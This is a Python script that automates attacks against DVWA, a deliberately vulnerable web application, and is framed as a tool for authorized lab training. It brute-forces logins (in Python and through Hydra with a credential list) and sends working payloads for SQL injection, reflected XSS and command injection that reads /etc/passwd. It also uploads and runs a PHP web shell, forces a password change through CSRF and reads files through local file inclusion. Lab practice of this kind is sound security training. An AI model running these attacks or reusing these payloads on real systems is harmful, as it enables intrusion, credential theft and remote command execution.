#!/usr/bin/env python3
"""
DVWA Attack Automation Script

This script demonstrates how to automate the execution of all major pentesting attack types 
against DVWA for educational and authorized testing purposes only.

WARNING: Only use this script in a legal, controlled environment (e.g., your own DVWA lab).
Unauthorized use is illegal and unethical.
"""
import requests
from bs4 import BeautifulSoup
import time
import subprocess
import os
import tempfile
import re
import argparse
import sys

# Default settings
DEFAULT_URL = "http://localhost:8080"
DEFAULT_USERNAME = "admin"
DEFAULT_PASSWORD = "password"

# Global session object
session = requests.Session()

def login(url, user, pwd):
    """Authenticate with DVWA"""
    login_url = f"{url}/login.php"
    print(f"[+] Attempting to login to {login_url} as {user}")
    
    r = session.get(login_url)
    if r.status_code == 404:
        print(f"[!] Login page not found at {login_url} (HTTP 404). Check URL and server status.")
        return False
        
    soup = BeautifulSoup(r.text, 'html.parser')
    user_token_tag = soup.find('input', {'name': 'user_token'})
    if not user_token_tag:
        print(f"[!] Could not find user_token on login page. Page content: {r.text[:500]}")
        user_token = ""
    else:
        user_token = user_token_tag['value']

    data = {
        'username': user,
        'password': pwd,
        'Login': 'Login',
        'user_token': user_token
    }
    
    try:
        resp = session.post(login_url, data=data)
        if 'Login failed' in resp.text or 'login.php' in resp.url:
             print(f"[-] Login failed for {user}")
             return False
        assert 'Logout' in resp.text, f"Login failed for user {user}!"
        print(f"[+] Logged in to DVWA as {user}")
        return True
    except requests.exceptions.RequestException as e:
        print(f"[!] RequestException during login for {user}: {e}")
        return False
    except AssertionError as e:
        print(f"[-] {e}")
        return False

def reconnaissance(url):
    """Perform basic reconnaissance"""
    print("\n[+] Performing HTTP header analysis...")
    r = session.get(url)
    print(r.headers)
    
    print("\n[+] Directory brute force (sample)...")
    for path in ['admin', 'phpmyadmin', 'test', 'backup']:
        target_url = f"{url}/{path}"
        resp = session.get(target_url)
        print(f"{target_url} => {resp.status_code}")

def brute_force(url, use_hydra=False):
    """Perform brute force attack using either Python or Hydra"""
    if use_hydra:
        print("[+] Attempting brute force on login using Hydra with a custom list...")

        # Check if Hydra is installed
        try:
            # Use 'which' on Unix-like systems or 'where' on Windows to locate hydra
            if os.name == 'nt':  # Windows
                result = subprocess.run(['where', 'hydra'], capture_output=True, text=True)
            else:  # Unix-like
                result = subprocess.run(['which', 'hydra'], capture_output=True, text=True)
            
            if result.returncode == 0 and result.stdout.strip():
                print(f"[i] Hydra is installed at: {result.stdout.strip()}")
            else:
                raise FileNotFoundError("Hydra not found in PATH")
        except (subprocess.SubprocessError, FileNotFoundError):
            # Try a direct hydra command as fallback
            try:
                # Just attempt to run hydra with a simple argument that won't cause errors
                subprocess.run(['hydra', '-h'], capture_output=True, timeout=5)
                print("[i] Hydra is installed and accessible.")
            except Exception as e:
                print(f"[!] Hydra verification failed: {e}")
                print("[!] Please ensure Hydra is properly installed and in your PATH.")
                print("    Install with: 'sudo apt install hydra' on Debian/Ubuntu or equivalent.")
                return

        # List of user:password pairs to try
        COMMON_USERS = ["msfadmin", "user", "postgres", "service", "dbadmin", "tomcat", "newpass", "sys", "klog", "root", "admin"]
        COMMON_PASSWORDS = ["msfadmin", "password", "s3cr3t", "postgres","new_password", "newpass", "service", "12345", "123456", "admin"]

        # Create a credentials list by combining users and passwords
        credentials_list = [f"{user}:{password}" for user in COMMON_USERS for password in COMMON_PASSWORDS]
        
        login_url = f"{url}/login.php"
        
        # Get a fresh user_token for the Hydra command template
        try:
            r_token = requests.get(login_url) # Use fresh requests, not session
            soup_token = BeautifulSoup(r_token.text, 'html.parser')
            user_token_hydra = soup_token.find('input', {'name': 'user_token'})['value']
        except Exception as e:
            print(f"[!] Failed to retrieve user_token for Hydra template: {e}")
            return

        with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.txt') as tmp_creds_file:
            for cred in credentials_list:
                tmp_creds_file.write(cred + '\n')
            tmp_creds_file_path = tmp_creds_file.name

        print(f"[i] Credentials list for Hydra written to: {tmp_creds_file_path}")

        # Parse the URL to get the correct hostname and port
        from urllib.parse import urlparse
        parsed_url = urlparse(url)
        hostname = parsed_url.hostname or 'localhost'
        port = parsed_url.port or (443 if parsed_url.scheme == 'https' else 80)
        
        # Updated Hydra command with form fields as they appear in the actual HTML form
        # This matches how the fields are structured in the HTML form
        form_data = (
            "username=^USER^&"
            "password=^PASS^&"
            "Login=Login&"
            f"user_token={user_token_hydra}"
        )
        
        hydra_command = [
            'hydra',
            '-C', tmp_creds_file_path,
            '-s', str(port),
            hostname,
            'http-post-form',
            f"/dvwa/login.php:{form_data}:S=Logout"
        ]

        print(f"[i] Executing Hydra: {' '.join(hydra_command)}")
        print(f"[i] Using form data: {form_data}")
        
        found_creds = None
        try:
            process = subprocess.run(hydra_command, capture_output=True, text=True, timeout=300)
            output = process.stdout
            print("[+] Hydra Output:")
            print(output)

            # More robust parsing for Hydra's output
            # Example line: [80][http-post-form] host: localhost   login: admin   password: password
            match = re.search(r"login:\s*(\S+)\s*password:\s*(\S+)", output, re.IGNORECASE)

            if match and "1 valid password found" in output:
                found_user = match.group(1)
                found_password = match.group(2)
                print(f"[!] Brute force success with Hydra! User: {found_user}, Password: {found_password}")

                # Attempt to login with the found credentials using the main session
                print(f"[i] Verifying login with found credentials: {found_user}:{found_password}")
                if login(url, found_user, found_password): # Use the login function
                    print(f"[+] Successfully logged in with Hydra found credentials: {found_user}:{found_password}")
                    found_creds = (found_user, found_password)
                else:
                    print(f"[-] Hydra reported success, but login verification failed for {found_user}:{found_password}")
            elif "0 valid passwords found" in output:
                print("[-] Hydra finished, but no valid passwords found.")
            else:
                print("[i] Hydra command executed. Review output for details. It might have failed or found no passwords.")
                if process.stderr:
                    print("[!] Hydra Errors:")
                    print(process.stderr)

        except subprocess.TimeoutExpired:
            print("[!] Hydra command timed out.")
        except FileNotFoundError:
            print("[!] Hydra command not found. Make sure Hydra is installed and in your PATH.")
        except Exception as e:
            print(f"[!] An error occurred while running Hydra: {e}")
        finally:
            os.remove(tmp_creds_file_path) # Clean up the temporary file
            print(f"[i] Temporary credentials file {tmp_creds_file_path} removed.")

        return found_creds # Return found credentials or None
    else:
        # Python-based brute force implementation
        print("[+] Attempting brute force on login...")
        
        # List of user:password pairs to try
        usernames = ["admin", "user", "msfadmin", "root", "postgres", "dbadmin"]
        passwords = ["password", "admin", "123456", "newpass", "12345", "msfadmin"]
        
        login_url = f"{url}/login.php"
        
        # Create a new session for brute force to avoid interfering with the main session
        bf_session = requests.Session()
        
        # Try all combinations
        for username in usernames:
            for password in passwords:
                print(f"[i] Trying: {username}:{password}")
                
                # Get a fresh token for each attempt
                try:
                    r_token = bf_session.get(login_url)
                    soup = BeautifulSoup(r_token.text, 'html.parser')
                    user_token = soup.find('input', {'name': 'user_token'})['value']
                except:
                    # If we can't get a token, try the last one we had
                    pass
                    
                data = {
                    'username': username,
                    'password': password,
                    'Login': 'Login',
                    'user_token': user_token
                }
                
                try:
                    resp = bf_session.post(login_url, data=data, allow_redirects=True)
                    
                    # Check if login was successful
                    if 'Logout' in resp.text and 'login.php' not in resp.url:
                        print(f"[+] SUCCESS! Valid credentials found: {username}:{password}")
                        return (username, password)
                    
                    # Avoid overwhelming the server
                    time.sleep(0.1)
                    
                except requests.exceptions.RequestException as e:
                    print(f"[!] Error during brute force attempt: {e}")
                    time.sleep(1)  # Longer pause after an error
        
        print("[-] Brute force completed. No valid credentials found.")
        return None

def sql_injection(url):
    """Test SQL injection vulnerability"""
    print("[+] Performing SQL Injection...")
    inj_url = f"{url}/vulnerabilities/sqli/?id=1%20OR%201=1--+&Submit=Submit"
    r = session.get(inj_url)
    if 'First name' in r.text:
        print("[!] SQL Injection successful!")
    else:
        print("[-] SQL Injection failed or not vulnerable.")

def xss(url):
    """Test Cross-Site Scripting vulnerability"""
    print("[+] Performing XSS attack...")
    xss_url = f"{url}/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>&Submit=Submit"
    r = session.get(xss_url)
    if "<script>alert('XSS')</script>" in r.text:
        print("[!] XSS payload reflected!")
    else:
        print("[-] XSS attack failed or not vulnerable.")

def command_injection(url):
    """Test Command Injection vulnerability"""
    print("[+] Performing Command Injection...")
    ci_url = f"{url}/vulnerabilities/exec/"
    data = {'ip': '127.0.0.1; cat /etc/passwd', 'Submit': 'Submit'}
    r = session.post(ci_url, data=data)
    if 'root:x:' in r.text:
        print("[!] Command Injection successful!")
    else:
        print("[-] Command Injection failed or not vulnerable.")

def file_upload(url):
    """Test File Upload vulnerability"""
    print("[+] Attempting file upload...")
    upload_url = f"{url}/vulnerabilities/upload/"
    files = {'uploaded': ('shell.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php')}
    data = {'Upload': 'Upload'}
    r = session.post(upload_url, files=files, data=data)
    if 'shell.php' in r.text or 'uploads/shell.php' in r.text:
        print("[!] File upload may be successful!")
        # Try to execute the uploaded shell
        shell_url = f"{url}/hackable/uploads/shell.php?cmd=whoami"
        r2 = session.get(shell_url)
        if r2.status_code == 200 and r2.text.strip():
            print("[+] Shell executed! Output:")
            print(r2.text)
        else:
            print("[-] Could not execute uploaded shell or no output.")
    else:
        print("[-] File upload failed or not reflected in response.")

def csrf(url):
    """Test Cross-Site Request Forgery vulnerability"""
    print("[+] Attempting CSRF attack (change password)...")
    profile_url = f"{url}/vulnerabilities/csrf/"
    
    # Create data for changing password
    data = {
        'password_new': 'newpass',
        'password_conf': 'newpass',
        'Change': 'Change'
    }
    # Submit via GET (CSRF scenario)
    query_params = "&".join([f"{key}={value}" for key, value in data.items()])
    csrf_url = f"{profile_url}?{query_params}"
    resp = session.get(csrf_url)
    if 'Password Changed' in resp.text:
        print("[!] CSRF successful!")
    else:
        print("[-] CSRF attack failed or not vulnerable.")

def lfi(url):
    """Test Local File Inclusion vulnerability"""
    print("[+] Attempting LFI (Low Security)...")
    lfi_url = f"{url}/vulnerabilities/fi/?page=../../../../../etc/passwd"
    r = session.get(lfi_url)
    if 'root:x:' in r.text:
        print("[!] LFI successful!")
    else:
        print("[-] LFI failed or not vulnerable at low security.")

def logout(url):
    """Log out from DVWA"""
    print("\n[+] Logging out...")
    
    try:
        r_check = session.get(url + "/index.php")
        if "Logout" in r_check.text:
            session.get(f"{url}/logout.php")
            print("[+] Logged out.")
        else:
            print("[i] Not logged in or session expired, skipping logout.")
    except requests.exceptions.RequestException as e:
        print(f"[!] Error during logout check: {e}")

def main():
    """Main function to run the attack automation"""
    parser = argparse.ArgumentParser(description="DVWA Attack Automation Script")
    parser.add_argument("--url", default=DEFAULT_URL, help=f"DVWA URL (default: {DEFAULT_URL})")
    parser.add_argument("--username", default=DEFAULT_USERNAME, help=f"Username (default: {DEFAULT_USERNAME})")
    parser.add_argument("--password", default=DEFAULT_PASSWORD, help=f"Password (default: {DEFAULT_PASSWORD})")
    parser.add_argument("--hydra", action="store_true", help="Use Hydra for brute force (default: Python)")
    parser.add_argument("--attacks", default="all", 
                        choices=["all", "recon", "brute", "sqli", "xss", "cmdi", "upload", "csrf", "lfi"],
                        help="Specific attack to run (default: all)")
    
    args = parser.parse_args()
    
    print("=" * 60)
    print(f"DVWA Attack Automation Script - Target: {args.url}")
    print("=" * 60)
    print("[!] WARNING: Only use against systems you own or have permission to test.")
    print("=" * 60)
    
    # Login first
    if not login(args.url, args.username, args.password):
        print("[!] Initial login failed. Exiting.")
        sys.exit(1)
    
    # Run selected attacks
    if args.attacks in ["all", "recon"]:
        reconnaissance(args.url)
    
    if args.attacks in ["all", "brute"]:
        brute_force(args.url, args.hydra)  # Use Hydra if specified
    
    # Re-login to ensure session is valid for other attacks
    if args.attacks == "all":
        print("[i] Re-establishing session...")
        login(args.url, args.username, args.password)
    
    if args.attacks in ["all", "sqli"]:
        sql_injection(args.url)
    
    if args.attacks in ["all", "xss"]:
        xss(args.url)
    
    if args.attacks in ["all", "cmdi"]:
        command_injection(args.url)
    
    if args.attacks in ["all", "upload"]:
        file_upload(args.url)
    
    if args.attacks in ["all", "csrf"]:
        csrf(args.url)
    
    if args.attacks in ["all", "lfi"]:
        lfi(args.url)
    
    # Always logout at the end
    logout(args.url)
    
    print("\n" + "=" * 60)
    print("[+] All tests completed.")
    print("=" * 60)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Script interrupted by user.")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Unexpected error: {e}")
        sys.exit(1)
